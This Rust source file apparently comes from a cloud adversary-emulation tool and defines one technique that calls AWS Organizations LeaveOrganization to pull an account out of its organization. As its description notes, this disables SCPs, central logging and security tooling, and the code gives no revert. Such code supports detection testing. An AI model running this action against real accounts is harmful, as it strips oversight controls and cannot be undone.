use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn detonate_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;

    match aws.organizations.leave_organization().send().await {
        Ok(_) => println!("Left AWS Organization — CloudTrail: LeaveOrganization"),
        Err(e) => {
            let msg = format!("{e}");
            if msg.contains("AWSOrganizationsNotInUseException")
                || msg.contains("not a member")
                || msg.contains("NotInOrganization")
            {
                println!(
                    "WARN: Not a member of an AWS Organization — LeaveOrganization is a no-op"
                );
            } else {
                return Err(anyhow::anyhow!("{}", e));
            }
        }
    }

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.defense-evasion.organizations-leave",
        friendly_name: "Attempt to Leave the AWS Organization",
        description: "Attempts to remove the current AWS account from its AWS Organization. This would disable organization-level SCPs, centralized logging, and security tooling enforced at the organization level.",
        detection: "CloudTrail: LeaveOrganization.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::DefenseEvasion],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: None,
    }
}
